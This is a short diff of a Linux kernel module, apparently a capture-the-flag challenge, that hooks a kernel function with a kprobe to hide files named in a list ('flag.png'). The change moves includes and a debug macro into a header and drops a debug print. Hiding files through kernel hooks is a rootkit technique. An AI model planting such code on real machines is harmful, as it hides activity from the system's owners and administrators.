@@ -6,15 +6,9 @@
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
 
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/kprobes.h>
+#include "file_hide.h"
 
-#ifdef DEBUG
-#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
-#else
-#define dbg_print(fmt, ...) /* No-op */
-#endif
+
 
 static const char *files_to_hide[] = {
 	"flag.png"
@@ -32,10 +26,6 @@ static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 	char *filename = (char *)regs->si;
 	const char **file;
 
-	dbg_print(
-		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
-		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
-		regs->flags);
 	for (file = files_to_hide; *file != NULL; file++) {
 		if (strcmp(filename, *file) == 0) {
 			dbg_print("Hiding file: %s\n", filename);
